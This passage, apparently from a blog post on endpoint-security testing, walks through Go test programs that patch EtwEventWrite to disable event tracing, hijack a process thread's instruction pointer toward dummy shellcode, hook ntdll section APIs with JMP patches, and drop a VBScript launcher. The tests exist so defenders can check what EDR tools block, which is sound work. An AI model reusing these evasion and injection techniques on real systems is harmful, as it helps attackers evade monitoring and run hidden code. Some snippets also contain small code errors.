</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	patch <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0xC3</span>} <span style="color:#6272a4">// RET instruction to bypass function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">copy</span>((<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span>[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>]<span style="color:#8be9fd">byte</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(mem)))[:], patch)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// patch EtwEventWrite
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), etwEventWrite.<span style="color:#50fa7b">Addr</span>(), <span style="color:#ff79c6">&amp;</span>patch[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(patch)), <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to patch EtwEventWrite: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">verifyMemoryPatch</span>(procHandle windows.Handle, remoteAddr <span style="color:#8be9fd">uintptr</span>, expectedData []<span style="color:#8be9fd">byte</span>) {
</span></span><span style="display:flex;"><span>	buffer <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#8be9fd;font-style:italic">len</span>(expectedData))
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> read <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">ReadProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>buffer[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)), <span style="color:#ff79c6">&amp;</span>read)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> read <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)) <span style="color:#ff79c6">||</span> !<span style="color:#50fa7b">compareBuffers</span>(buffer, expectedData) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] Memory patch verification failed&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Memory patch verification succeeded&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">compareBuffers</span>(buf1, buf2 []<span style="color:#8be9fd">byte</span>) <span style="color:#8be9fd">bool</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(buf1) <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">len</span>(buf2) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> buf1 {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> buf1[i] <span style="color:#ff79c6">!=</span> buf2[i] {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="remote-thread-context-manipulation">remote thread context manipulation</h2>
<p>attackers can modify the execution context of a thread in a remote process, allowing them to execute arbitrary code within the process. this happens a lot with process injection attacks.</p>
<p>the test first retrieves the context of the main thread of the target process and modifies its instruction pointer (<code>RIP</code>) to point to the address of injected shellcode. attackers can hijack threads to execute payloads this way.</p>
<p>by changing the thread&rsquo;s context, the test forces the process to execute the injected code, simulating the achievement of remote code execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Remote Thread Context Manipulation [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Start a target process to work with
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Get handle to the target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// main thread of target proc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	threadHandle, err <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">getMainThreadHandle</span>(cmd.Process.Pid)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get main thread handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// manipulating thread context
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> context windows.Context
</span></span><span style="display:flex;"><span>	context.ContextFlags = windows.CONTEXT_FULL
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">GetThreadContext</span>(threadHandle, <span style="color:#ff79c6">&amp;</span>context)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get thread context: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// change thread context: change instruction pointer to shellcode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	context.Rip = <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>dummyShellcode[<span style="color:#bd93f9">0</span>]))
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">SetThreadContext</span>(threadHandle, <span style="color:#ff79c6">&amp;</span>context)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to set thread context: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Remote thread context manipulation executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">getMainThreadHandle</span>(pid <span style="color:#8be9fd">int</span>) (windows.Handle, <span style="color:#8be9fd">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> snapshot windows.Handle
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> entry windows.ThreadEntry32
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// take snapshot of specified processes
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	snapshot, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">CreateToolhelp32Snapshot</span>(windows.TH32CS_SNAPTHREAD, <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> windows.<span style="color:#50fa7b">CloseHandle</span>(snapshot)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	entry.Size = <span style="color:#8be9fd;font-style:italic">uint32</span>(unsafe.<span style="color:#50fa7b">Sizeof</span>(entry))
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// retrieve info about first thread of process from snapshot
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">Thread32First</span>(snapshot, <span style="color:#ff79c6">&amp;</span>entry)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> entry.OwnerProcessID <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(pid) {
</span></span><span style="display:flex;"><span>			threadHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenThread</span>(windows.THREAD_ALL_ACCESS, <span style="color:#ff79c6">false</span>, entry.ThreadID)
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, err
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> threadHandle, <span style="color:#ff79c6">nil</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">Thread32Next</span>(snapshot, <span style="color:#ff79c6">&amp;</span>entry)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>, fmt.<span style="color:#50fa7b">Errorf</span>(<span style="color:#f1fa8c">&#34;no main thread found for process %d&#34;</span>, pid)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> dummyShellcode = []<span style="color:#8be9fd">byte</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-windows-nt-api-hooking">suspicious windows NT API hooking</h2>
<p><strong>API hooking</strong> is an attack where the behaviour of system APIs is intercepted and modified. by hooking APIs, attackers strive to alter the way system calls (syscalls) behave, usually to inject payloads or evade detection. hooking critical system APIs subverts normal system operations, and is used in a lot of attacks.</p>
<p>the test first hooks several sensitive NT APIs related to memory management and section mapping. this is done by writing a <code>JMP</code> instruction to redirect the API calls to a custom function, simulating how attackers might hijack the APIs.</p>
<p>the test then dynamically resolves the addresses of these APIs, which is crucial in identifying and hooking specific functions in a live system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> ntdll = windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious Windows NT API Hooking [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// define NT API functions to hook
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	hookAPIs <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;ZwCreateSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtCreateSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwOpenSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtOpenSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwClose&#34;</span>, <span style="color:#f1fa8c">&#34;NtClose&#34;</span>, <span style="color:#f1fa8c">&#34;ZwMapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtMapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwUnmapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtUnmapViewOfSection&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// load ntdll + get addresses of APIs
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> _, api <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> hookAPIs {
</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">:=</span> ntdll.<span style="color:#50fa7b">NewProc</span>(api)
</span></span><span style="display:flex;"><span>		addr <span style="color:#ff79c6">:=</span> proc.<span style="color:#50fa7b">Addr</span>()
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] Address of %s: 0x%X&#34;</span>, api, addr))
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// hook API by writing JMP instruction to custom function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#50fa7b">hookAPI</span>(addr)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;hooked all specified NT APIs&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">hookAPI</span>(addr <span style="color:#8be9fd">uintptr</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// JMP to custom function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	jmp <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0xE9</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>} <span style="color:#6272a4">// JMP rel32
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	relAddr <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>customFunction)) <span style="color:#ff79c6">-</span> (addr <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span><span style="color:#8be9fd">uintptr</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>jmp[<span style="color:#bd93f9">1</span>])) = relAddr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write JMP to target API address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> oldProtect <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualProtect</span>(addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), windows.PAGE_EXECUTE_READWRITE, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	_, err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), addr, <span style="color:#ff79c6">&amp;</span>jmp[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">VirtualProtect</span>(addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), oldProtect, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to restore memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">customFunction</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Custom function to be called by the hooked APIs
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Custom function called by hooked API&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="net-com-object-creation-in-non-standard-windows-script-interpreter">.NET COM object creation in non-standard windows script interpreter</h2>
<p>attackers can create .NET COM objects from within non-standard script interpreters (like VBScript) to execute arbitrary Win32 APIs. scripting languages can be used to execute .NET code and used to achieve similar ends as a more conventional binary payload, which is easily detected.</p>
<p>the test runs a VBScript that attempts to launch <code>notepad.exe</code>. attackers use a script to bootstrap the execution of more complex code.</p>
<p>then, the creation of a .NET COM object and the execution of shellcode within the context of the script is simulated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> scriptPath = <span style="color:#f1fa8c">&#34;C:\\Windows\\Temp\\suspiciousScript.vbs&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting .NET COM object created in non-standard Windows Script Interpreter [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create new VBS script file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	scriptContent <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">`
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	Set obj = CreateObject(&#34;WScript.Shell)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	obj.Run &#34;notepad.exe&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	`</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">WriteFile</span>(scriptPath, []<span style="color:#8be9fd;font-style:italic">byte</span>(scriptContent), <span style="color:#bd93f9">0644</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
